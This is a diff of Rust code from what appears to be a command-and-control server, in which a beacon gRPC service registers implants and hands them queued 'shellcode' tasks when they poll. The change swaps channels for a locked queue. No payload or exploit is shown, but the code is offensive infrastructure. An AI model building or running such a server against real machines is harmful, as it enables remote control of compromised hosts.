@@ -21,9 +21,9 @@ pub mod tasks {
 type Task = String;
 const HEARTBEAT: u32 = 5000; // TODO: variable heartbeat config for implant
 
-#[derive(Debug)]
+#[derive(Debug, Default)]
 pub struct Implant {
-    pub tasks: (Sender<Task>, Receiver<Task>),
+    pub tasks: RwLock<VecDeque<Task>>,
 }
 
 #[derive(Debug, Default)]
@@ -32,14 +32,10 @@ pub struct Beacon {
 }
 impl Beacon {
     pub async fn add_task(&self, task: Task) {
-        let mut map = self.implants.write().await;
+        let map = self.implants.read().await;
 
-        for (_, val) in map.iter_mut() {
-            val.tasks
-                .0
-                .send(task.clone())
-                .await
-                .expect("Channel send failure.");
+        for (_, val) in map.iter() {
+            val.tasks.write().await.push_back(task.clone())
         }
     }
 }
@@ -55,7 +51,7 @@ impl BeaconService for Arc<Beacon> {
         println!("Got a connection request");
 
         let mut map = self.implants.write().await;
-        map.insert(id, Implant { tasks: channel(5) });
+        map.insert(id, Implant::default());
 
         Ok(Response::new(ConnectionResponse {
             uuid: id.to_string(),
@@ -71,10 +67,10 @@ impl BeaconService for Arc<Beacon> {
             return Err(Status::invalid_argument("Failed to parse uuid."));
         }
 
-        let mut map = self.implants.write().await;
+        let map = self.implants.read().await;
         Ok(Response::new(PollResponse {
-            shellcode: match map.get_mut(&id.unwrap()) {
-                Some(v) => v.tasks.1.recv().await,
+            shellcode: match map.get(&id.unwrap()) {
+                Some(v) => v.tasks.write().await.pop_front(),
                 None => {
                     return Err(Status::not_found(
                         "Client doesn't exist or isn't connected.",
